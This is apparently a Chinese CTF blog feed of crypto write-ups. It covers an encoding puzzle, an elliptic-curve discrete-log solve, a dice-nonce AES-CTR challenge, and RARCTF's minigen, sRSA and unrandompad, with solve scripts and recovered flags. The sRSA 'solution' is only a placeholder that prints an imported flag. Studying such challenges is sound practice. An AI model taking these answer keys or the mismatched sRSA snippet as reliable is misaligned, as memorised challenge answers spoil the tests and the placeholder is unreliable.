mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:Jj8&lt;</p>
</blockquote>
<p>看wp的，签到也不会，不能太信任CyberChef的Magic；wp应该漏了一层base64</p>
<p>From Base85 -&gt;From Base64-&gt; From Hex -&gt; From Decimal -&gt; From Octal -&gt; From Binary</p>
<p>中间还是有被迷到，但结果没错</p>
<h2 id="blecc"><a href="#blecc" class="headerlink" title="blecc"></a>blecc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">p = 17459102747413984477</span><br><span class="line">a = 2</span><br><span class="line">b = 3</span><br><span class="line">G = (15579091807671783999, 4313814846862507155)</span><br><span class="line">Q = (8859996588597792495, 2628834476186361781)</span><br><span class="line">d = ???</span><br><span class="line">Can you help me find `d`?</span><br><span class="line">Decode it as a string and wrap in flag format.</span><br></pre></td></tr></table></figure>

<p>虽然知道是简单题，但是由于不会ECC，所以还是卡了好久</p>
<p>目标确实是求 d，和 DLP 很像，给了一个 p，可以想到是用类似 discrete_log 的方法解离散对数 ；看了很多师傅的笔记，La佬的 exp 中有个 P 不知道是啥，然后直接在 github 上搜 ECDLP，然后搜到下面这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Curve parameters</span></span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line">a, b = <span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Target secret key</span></span><br><span class="line">d = <span class="number">4121</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup curve</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.gen(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">P = d * G  <span class="comment"># (429940 : 231132 : 1)</span></span><br><span class="line"></span><br><span class="line">dl = discrete_log(P, G, G.order(), operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> dl == d</span><br></pre></td></tr></table></figure>

<p>依照他这个改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">17459102747413984477</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">G = (<span class="number">15579091807671783999</span>, <span class="number">4313814846862507155</span>)</span><br><span class="line">Q = (<span class="number">8859996588597792495</span>, <span class="number">2628834476186361781</span>)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">G = E.point(G)</span><br><span class="line">Q = E.point(Q)</span><br><span class="line">dl = discrete_log(Q, G, G.order(), operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(dl))</span><br></pre></td></tr></table></figure>

<p>出来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">m1n1_3cc</span><br></pre></td></tr></table></figure>

<p>感觉 ECC 也没有特别复杂，可以在后续研究一下，毕竟没有 RSA 那么多</p>
<h2 id="yahtzee（unsolved）"><a href="#yahtzee（unsolved）" class="headerlink" title="yahtzee（unsolved）"></a><strong>yahtzee</strong>（unsolved）</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc mc.ax 31076</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pseudo-random number generators are weak! I use only true RNGs, like rolling a set of dice!</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keyfile&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key)==<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Pseudorandom number generators are weak!</span></span><br><span class="line"><span class="string">True randomness comes from phyisical objects, like dice!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrueRNG</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">die</span>():</span></span><br><span class="line">        <span class="keyword">return</span> randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">yahtzee</span>(<span class="params">N</span>):</span></span><br><span class="line">        dice = [TrueRNG.die() <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(dice)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, num_dice</span>):</span></span><br><span class="line">        self.rolls = num_dice</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> TrueRNG.yahtzee(self.rolls)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message, key, true_rng</span>):</span></span><br><span class="line">    nonce = true_rng.<span class="built_in">next</span>()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, nonce = long_to_bytes(nonce))</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Stick the flag in a random quote!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_message</span>():</span></span><br><span class="line">    NUM_QUOTES = <span class="number">25</span></span><br><span class="line">    quote_idx = randint(<span class="number">0</span>,NUM_QUOTES-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;quotes.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> idx, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">            <span class="keyword">if</span> idx == quote_idx:</span><br><span class="line">                quote = line.strip().split()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    quote.insert(randint(<span class="number">0</span>, <span class="built_in">len</span>(quote)), flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(quote)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================================</span></span><br><span class="line"><span class="string">=            Welcome to the yahtzee message encryption service.            =</span></span><br><span class="line"><span class="string">=  We use top-of-the-line TRUE random number generators... dice in a cup!  =</span></span><br><span class="line"><span class="string">============================================================================</span></span><br><span class="line"><span class="string">Would you like some samples?</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">prompt = <span class="string">&quot;Would you like some more samples, or are you ready to &#x27;quit&#x27;?\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    NUM_DICE = <span class="number">2</span></span><br><span class="line">    true_rng = TrueRNG(NUM_DICE)</span><br><span class="line">    inp      = <span class="built_in">input</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;quit&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> inp.lower():</span><br><span class="line">        message = random_message().encode()</span><br><span class="line">        encrypted = encrypt(message, key, true_rng)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Ciphertext:&#x27;</span>, hexlify(encrypted).decode())</span><br><span class="line">        inp = <span class="built_in">input</span>(prompt)</span><br></pre></td></tr></table></figure>

<p>看不懂</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210807 rar BSidesNoidaCrypto方向部分WP</title>
    <url>/posts/80918a4f/</url>
    <content><![CDATA[<p>国外的题目小二活，尚师傅得心应手，自己还需努力</p>
<span id="more"></span>

<h2 id="RARCTF"><a href="#RARCTF" class="headerlink" title="RARCTF"></a>RARCTF</h2><p>注意：没有给数据的题目一般都是给了个nc连接</p>
<h3 id="Crypto-minigen"><a href="#Crypto-minigen" class="headerlink" title="Crypto-minigen"></a>Crypto-minigen</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;def f(x):&#x27;</span>+<span class="string">&#x27;yield((x:=-~x)*x+-~-x)%727;&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">g=f(<span class="built_in">id</span>(f));<span class="built_in">print</span>(*<span class="built_in">map</span>(<span class="keyword">lambda</span> c:<span class="built_in">ord</span>(c)^<span class="built_in">next</span>(g),<span class="built_in">list</span>(<span class="built_in">open</span>(<span class="string">&#x27;f&#x27;</span>).read())))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A stream cipher in only 122 bytes!</span><br><span class="line">Note: This has been tested on python versions 3.8 and 3.9</span><br></pre></td></tr></table></figure>

<p>题目不长，但比较难读这样精简的python代码，<em>在尚师傅手把手的点拨下艰难地签完到</em></p>
<p>要知道exec，yield，id主要这三个函数以及python中取反符号<code>~</code>的等价表达式，建议百度</p>
<p>经过层层剖析，最后提取这样一个流密码算法，当然还要模上727</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/minigen.png" alt="minigen"></p>
<p>然后我在草稿纸上写着$(x+1)^2+(x+1)+1-x^2-x-1=2x+2$，然后确实神志不太清，没想到了</p>
<p>尚师傅一眼看出，不同的id(f)内，一个id(f)，或者称为流密码的起始状态固定，那么后面两个迭代器g之间相差的值是固定的</p>
<p>比如举个栗子，比如id(f)=1，那每个g之间就依次相差<code>4 6 8 10 12……</code>，而且整个空间是在模727下的，所以要爆破也在爆破的范围内</p>
<p>但是没有爆破的必要，假设flag的开头就是’rarctf’，那么我们异或回去，g的前6个值分别是<code>363 578 68 287 508</code>，可以看出它们之间依次相差<code>215 217 219 221 223</code>，然后往后走就好了，求得g，异或回去还不简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;def f(x):&#x27;</span>+<span class="string">&#x27;yield((x:=-~x)*x+-~-x)%727;&#x27;</span>*<span class="number">100</span>)</span><br><span class="line"><span class="comment"># print(*map(lambda c:ord(c)^next(g),list(open(&#x27;f&#x27;).read())))</span></span><br><span class="line"><span class="comment"># ((x:=-~x)*x+-~-x)%727</span></span><br><span class="line">c = <span class="string">&#x27;281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fi = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    fi.append(<span class="built_in">int</span>(i))</span><br><span class="line">flag = <span class="string">&#x27;r&#x27;</span></span><br><span class="line">s = <span class="number">363</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fi[<span class="number">1</span>:]:</span><br><span class="line">    flag += <span class="built_in">chr</span>((s + <span class="number">215</span> + <span class="number">2</span> * x) % <span class="number">727</span> ^ i)</span><br><span class="line">    s = (s+<span class="number">215</span>+<span class="number">2</span>*x) % <span class="number">727</span></span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>再次感谢尚师傅带我打CTF</p>
<h3 id="Crypto-sRSA"><a href="#Crypto-sRSA" class="headerlink" title="Crypto-sRSA"></a>Crypto-sRSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x69420</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct =&quot;</span>,(flag * e) % n)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 5496273377454199065242669248583423666922734652724977923256519661692097814683426757178129328854814879115976202924927868808744465886633837487140240744798219</span><br><span class="line">e = 431136</span><br><span class="line">ct = 3258949841055516264978851602001574678758659990591377418619956168981354029697501692633419406607677808798749678532871833190946495336912907920485168329153735</span><br></pre></td></tr></table></figure>

<p>用到ElGamal类似的思想，直接求逆元</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>有手就行</p>
<h3 id="Crypto-unrandompad"><a href="#Crypto-unrandompad" class="headerlink" title="Crypto-unrandompad"></a>Crypto-unrandompad</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span> <span class="comment"># normal rsa key generation</span></span><br><span class="line">  primes = []</span><br><span class="line">  e = <span class="number">3</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      p = getPrime(<span class="number">1024</span>)</span><br><span class="line">      <span class="keyword">if</span> (p - <span class="number">1</span>) % <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    primes.append(p)</span><br><span class="line">  <span class="keyword">return</span> e, primes[<span class="number">0</span>] * primes[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m, n</span>):</span> <span class="comment"># pkcs#1 v1.5</span></span><br><span class="line">  ms = long_to_bytes(m)</span><br><span class="line">  ns = long_to_bytes(n)</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(ms) &gt;= <span class="built_in">len</span>(ns) - <span class="number">11</span>:</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">  padlength = <span class="built_in">len</span>(ns) - <span class="built_in">len</span>(ms) - <span class="number">3</span></span><br><span class="line">  ps = long_to_bytes(getrandbits(padlength * <span class="number">8</span>)).rjust(padlength, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;\x00\x02&quot;</span> + ps + <span class="string">b&quot;\x00&quot;</span> + ms, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, e, n</span>):</span> <span class="comment"># standard rsa</span></span><br><span class="line">  res = pad(m, n)</span><br><span class="line">  <span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c: <span class="subst">&#123;<span class="built_in">pow</span>(m, e, n)&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error :(&quot;</span>, <span class="string">&quot;message too long&quot;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1] enc()</span></span><br><span class="line"><span class="string">[2] enc(flag)</span></span><br><span class="line"><span class="string">[3] quit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">e, n = keygen()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(menu)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&quot;opt: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> opt == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">      encrypt(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;msg: &quot;</span>)), e, n)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">      encrypt(bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()), e, n)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;bye&quot;</span>)</span><br><span class="line">      exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;idk&quot;</span>)</span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error :(&quot;</span>, e)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Yeah I use randomized padding, it increases security!Note: This is a part 1 challenge of randompad. Take a look at the source for that one and compare the two for a hint on how to solve.</span><br></pre></td></tr></table></figure>

